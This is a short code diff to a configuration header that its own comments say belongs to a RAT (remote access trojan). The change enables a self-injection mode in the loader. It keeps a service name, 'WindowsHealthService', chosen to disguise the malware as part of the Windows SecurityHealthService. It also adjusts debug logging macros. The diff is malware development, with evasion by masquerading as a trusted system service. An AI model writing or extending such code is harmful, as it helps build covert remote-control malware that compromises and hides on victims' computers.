@@ -2,7 +2,10 @@
 
 //Uncommenting this macro will let every module create a console useful for debugging since some modules can't be compiled in debug mode
 //such as the main loader and the shell
-#define _DEBUG 
+//#define DEBUG 
+
+//Uncommenting this macro will make the loader perform auto injection instead of relying on the embedded image
+#define SELF_INJECTION
 
 //The RAT will attempt to disguise itself as an extension of the already existing SecurityHealthService
 #define SERVICE_NAME			"WindowsHealthService"
@@ -33,14 +36,10 @@
 #endif
 
 //Used to log information to the spawned console
-#ifdef	_DEBUG
+#ifdef	DEBUG
 #define Log(x)					printf(x)
 #else
 #define Log(x) 
 #endif
 
-#ifdef _WIN64
 #define ExePath ExePathA
-#else
-#define ExePath ExePathW
-#endif
